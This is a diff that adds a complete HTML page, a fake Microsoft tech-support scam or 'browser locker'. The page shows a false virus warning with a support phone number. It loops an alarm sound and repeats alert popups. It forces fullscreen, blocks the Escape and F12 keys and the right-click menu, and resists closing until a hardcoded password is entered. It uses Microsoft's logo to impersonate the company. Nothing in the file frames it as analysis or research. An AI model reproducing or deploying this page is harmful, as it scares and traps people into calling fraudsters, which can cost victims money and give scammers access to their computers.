@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>New Message</title>
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+    <style>
+        body {
+            margin: 0;
+            background: black;
+            color: red;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            user-select: none;
+        }
+        h1 {
+            font-size: 50px;
+            color: yellow;
+            text-shadow: 2px 2px 8px red;
+        }
+        p {
+            font-size: 25px;
+        }
+        button {
+            padding: 20px;
+            font-size: 20px;
+            background: red;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+
+<body oncontextmenu="return false">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="100">
+    <h1>WARNING ⚠️</h1>
+    <p>Virus Detected!<br>Call Microsoft Support: 1800-121212<br>Your PC is Locked.</p>
+    <button onclick="triggerAlert()">OK</button>
+
+    <audio id="alertSound" loop autoplay>
+        <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
+    </audio>
+
+<script>
+    function triggerAlert(){
+        alert('Virus Infection Still Exists!\nCall Support: 1800-121212');
+    }
+
+    setInterval(() => {
+        alert('WARNING! Your PC is at Risk!\nCall Microsoft Support Immediately: 1800-121212');
+    }, 5000);
+
+    document.addEventListener('keydown', function(e) {
+        if(e.key === "Escape" || e.key === "F12"){
+            e.preventDefault();
+        }
+    });
+
+    window.onbeforeunload = function(){
+        return "Virus Warning! Cannot Leave Without Password.";
+    };
+
+    function checkPassword(){
+        let pass = prompt('Enter Unlock Password:');
+        if(pass === 'harsh'){
+            alert('Access Granted');
+            window.onbeforeunload = null;
+        } else {
+            alert('Wrong Password! Call Support: 1800-121212');
+        }
+    }
+
+    setInterval(() => {
+        if(!document.fullscreenElement){
+            document.documentElement.requestFullscreen();
+        }
+    }, 1000);
+</script>
+
+<br><br>
+<button onclick="checkPassword()">Unlock</button>
+
+</body>
+</html>
